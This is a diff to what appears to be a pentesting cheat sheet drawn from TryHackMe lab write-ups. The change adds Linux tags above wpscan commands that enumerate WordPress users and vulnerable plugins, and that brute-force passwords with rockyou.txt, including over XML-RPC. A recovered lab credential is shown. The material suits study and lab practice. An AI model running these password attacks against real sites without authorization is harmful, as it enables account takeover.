@@ -6,6 +6,7 @@ WordPress scanner for version detection, user enumeration, vulnerable plugin/the
 
 ### Enumerate vulnerable plugins and users
 
+<!-- cmd: linux -->
 ```bash
 wpscan --url http://internal.thm/blog -e vp,u
 ```
@@ -16,6 +17,7 @@ confirmed WordPress context and user enumeration surface.
 
 ### Brute-force a known user
 
+<!-- cmd: linux -->
 ```bash
 wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
 ```
@@ -32,6 +34,7 @@ found `admin:my2boys`.
 
 ### Enumerate WordPress users
 
+<!-- cmd: linux -->
 ```bash
 wpscan --url http://blog.thm --enumerate u
 ```
@@ -42,6 +45,7 @@ recovered candidate usernames before XML-RPC brute force.
 
 ### XML-RPC password attack
 
+<!-- cmd: linux -->
 ```bash
 wpscan --url http://blog.thm --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/rockyou.txt -t 50
 ```
